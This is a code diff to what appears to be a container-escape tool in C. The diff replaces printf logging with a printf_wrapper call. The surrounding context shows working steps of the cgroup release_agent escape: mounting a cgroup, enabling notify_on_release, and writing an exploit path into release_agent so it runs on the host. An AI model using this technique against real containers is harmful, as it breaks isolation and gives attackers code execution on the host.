@@ -36,8 +36,8 @@ int clear_cgroup_procs(void *args) {
 
     sprintf(pid, "%d", getpid());
 
-    printf("[INFO] Echo pid: %s to %s and this pid of process will close soon\n", pid,
-           cgroup_procs_args->cgroup_procs_path);
+    printf_wrapper(INFO, "Echo pid: %s to %s and this pid of process will close soon\n", pid,
+                   cgroup_procs_args->cgroup_procs_path);
 
     fd = open(cgroup_procs_args->cgroup_procs_path, O_WRONLY);
     write(fd, pid, strlen(pid));
@@ -111,7 +111,7 @@ void reverse() {
 
 
 int escape_by_release_agent(char *container_path_in_host) {
-    printf("[INFO] Start escape by release_agent\n");
+    printf_wrapper(INFO, "Start escape by release_agent\n");
     const int cgroup_path_random_length = 10;
     const int controller_path_random_length = 5;
     const int release_agent_exp_path_length = 5;
@@ -132,7 +132,7 @@ int escape_by_release_agent(char *container_path_in_host) {
     if (stat(mount_path, &st) == -1) {
         mkdir(mount_path, 0700);
     }
-    printf("[INFO] Cgroup mount path: %s\n", mount_path);
+    printf_wrapper(INFO, "Cgroup mount path: %s\n", mount_path);
     if (mount("cgroup", mount_path, "cgroup", 0, controller)) {
         perror("mount failed");
     }
@@ -143,7 +143,7 @@ int escape_by_release_agent(char *container_path_in_host) {
     strcpy(controller_path, mount_path);
     strcat(controller_path, "/");
     strcat(controller_path, controller_path_random);
-    printf("[INFO] New cgroup controller path: %s\n", controller_path);
+    printf_wrapper(INFO, "New cgroup controller path: %s\n", controller_path);
     if (stat(controller_path, &st) == -1) {
         mkdir(controller_path, 0777);
     }
@@ -152,7 +152,7 @@ int escape_by_release_agent(char *container_path_in_host) {
     strcpy(notify_on_release_path, controller_path);
     strcat(notify_on_release_path, "/notify_on_release");
 
-    printf("[INFO] Enable notify_on_release: %s\n", notify_on_release_path);
+    printf_wrapper(INFO, "Enable notify_on_release: %s\n", notify_on_release_path);
 
     // set release_agent
     int fd;
@@ -162,14 +162,14 @@ int escape_by_release_agent(char *container_path_in_host) {
 
     strcpy(release_agent_path, mount_path);
     strcat(release_agent_path, "/release_agent");
-    printf("[INFO] Path of release_agent: %s\n", release_agent_path);
+    printf_wrapper(INFO, "Path of release_agent: %s\n", release_agent_path);
 
     char *release_agent_exp_path_random = malloc(release_agent_exp_path_length + 1);
     rand_string(release_agent_exp_path_random, release_agent_exp_path_length);
     strcpy(release_agent_exp_path, container_path_in_host);
     strcat(release_agent_exp_path, "/tmp/");
     strcat(release_agent_exp_path, release_agent_exp_path_random);
-    printf("[INFO] Write exp_path to release_agent: %s\n", release_agent_exp_path);
+    printf_wrapper(INFO, "Write exp_path to release_agent: %s\n", release_agent_exp_path);
     fd = open(release_agent_path, O_WRONLY);
     ssize_t len = write(fd, release_agent_exp_path, strlen(release_agent_exp_path));
     if (len < 0) {
@@ -179,7 +179,7 @@ int escape_by_release_agent(char *container_path_in_host) {
 
     //
     strcat(exp_path, release_agent_exp_path_random);
-    printf("[INFO] Exp path: %s\n", exp_path);
+    printf_wrapper(INFO,"Exp path: %s\n", exp_path);
 
     // rwx--x--x
     int exp_mode = S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH;
